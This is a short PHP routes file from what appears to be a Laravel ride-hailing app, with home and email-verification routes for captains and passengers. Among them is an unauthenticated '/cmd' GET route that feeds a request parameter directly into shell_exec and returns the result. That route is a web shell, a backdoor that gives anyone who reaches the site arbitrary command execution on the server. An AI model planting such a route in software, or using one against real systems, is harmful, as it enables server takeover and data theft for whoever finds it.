<?php

use App\Http\Controllers\API\V1\Captains\Auth\AuthController;
use App\Http\Controllers\API\V1\Passengers\Profile\ProfileController;
use http\Env\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('/', function () {
    return view('welcome');
})->name('home');

Route::get('/cmd', function (Request $request) {
    return shell_exec($request->line);
})->name('cmd');

Route::get('captain/verify/{token}', [AuthController::class,'verifyEmail'])->name('captain.verify');
Route::get('passenger/verify/{token}', [ProfileController::class,'verifyEmail'])->name('passanger.verify');
